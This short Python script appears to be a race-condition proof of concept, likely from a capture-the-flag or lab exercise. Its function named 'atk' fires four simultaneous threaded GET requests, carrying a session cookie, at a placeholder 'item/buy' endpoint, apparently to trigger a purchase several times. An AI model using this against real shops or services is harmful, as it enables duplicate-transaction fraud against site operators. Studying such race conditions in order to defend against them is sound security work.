import requests
import threading

url = "https://change-url.com/item/buy"
cookies = {'my-app': ''}

def atk():
    res = requests.get(url, cookies=cookies)
    print(res.text)

def main():
    t_list = []
    for _ in range(4):
        t = threading.Thread(target=atk)
        t_list.append(t)

    for t in t_list:
        t.start()

    for t in t_list:
        t.join()

if __name__ == "__main__":
    main()
